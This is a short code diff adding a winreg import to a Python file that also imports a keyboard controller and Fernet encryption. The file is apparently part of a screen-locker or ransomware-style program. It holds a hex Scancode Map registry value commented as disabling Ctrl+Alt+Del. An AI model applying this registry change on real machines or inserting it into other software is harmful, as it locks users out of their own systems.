@@ -8,6 +8,7 @@ from pynput.keyboard import Controller, Key
 import sys
 from cryptography.fernet import Fernet
 import struct
+import winreg
 
 # Registry entry (in hexadecimal format for disable ctrl+alt+del)
 registry_input = "00,00,00,00,00,00,00,00,03,00,00,00,4d,e0,1d,e0,4b,e0,1d,00,00,00,00,00"
